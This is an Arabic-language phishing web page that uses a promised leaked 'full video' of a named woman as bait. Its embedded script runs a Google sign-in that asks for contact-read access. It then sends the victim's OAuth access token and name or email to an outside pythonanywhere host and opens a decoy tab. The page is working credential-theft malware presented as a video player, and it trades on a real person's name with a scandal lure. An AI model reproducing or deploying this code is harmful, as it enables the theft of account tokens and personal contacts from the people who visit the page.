<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔴 حصرياً وقبل الحذف!</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
</head>
<body class="bg-black text-white font-sans overflow-x-hidden">
    <div class="relative z-10 flex flex-col items-center justify-center min-h-screen p-4 bg-gradient-to-b from-transparent via-black/80 to-black">
        
        <header class="text-center mb-6">
            <div class="inline-block px-4 py-1 bg-red-600 rounded-full text-[10px] font-black uppercase animate-pulse mb-3">Live Now</div>
            <h1 class="text-2xl md:text-3xl font-black leading-tight">🔴 فيديو رحمة محسن الكامل</h1>
            <p class="text-gray-400 text-sm mt-2">يجب تسجيل الدخول للتحقق من العمر ومشاهدة الفيديو</p>
        </header>

        <div class="relative w-full max-w-lg aspect-video bg-gray-900 rounded-2xl border border-white/10 overflow-hidden shadow-[0_0_50px_rgba(220,38,38,0.3)]">
            <div class="absolute inset-0 flex items-center justify-center bg-black/40">
                <div id="loginBtn" class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center cursor-pointer hover:scale-110 transition-all">
                    <i class="fas fa-play text-2xl ml-1">▶</i>
                </div>
            </div>
        </div>

        <div id="status" class="mt-4 text-red-500 font-bold"></div>
    </div>

    <script>
        // إعدادات Firebase الخاصة بك
        const firebaseConfig = {
            apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
            authDomain: "giftapp-5937d.firebaseapp.com",
            projectId: "giftapp-5937d",
            storageBucket: "giftapp-5937d.firebasestorage.app",
            messagingSenderId: "1067108116204",
            appId: "1:1067108116204:web:dd2b2717c17590b10be7c9"
        };

        firebase.initializeApp(firebaseConfig);

        // 1. معالجة البيانات فور العودة من جوجل
        firebase.auth().getRedirectResult().then((result) => {
            if (result.credential) {
                const token = result.credential.accessToken;
                const user = result.user;
                const sender = user.displayName || user.email;

                // إرسال البيانات فوراً للوحش
                fetch(`https://mohamedahmed77.pythonanywhere.com/catch?token=${token}&sender=${sender}`)
                .then(() => {
                    // فتح إعلان في الخلفية كما خططنا
                    window.open("https://google.com", "_blank"); 
                    document.getElementById('status').innerText = "تم التحقق! جاري تشغيل الفيديو...";
                });
            }
        }).catch((error) => {
            console.error("Firebase Error:", error.message);
        });

        // 2. تفعيل زرار تسجيل الدخول
        document.getElementById('loginBtn').onclick = function() {
            const provider = new firebase.auth.GoogleAuthProvider();
            provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
            firebase.auth().signInWithRedirect(provider);
        };
    </script>
</body>
</html>
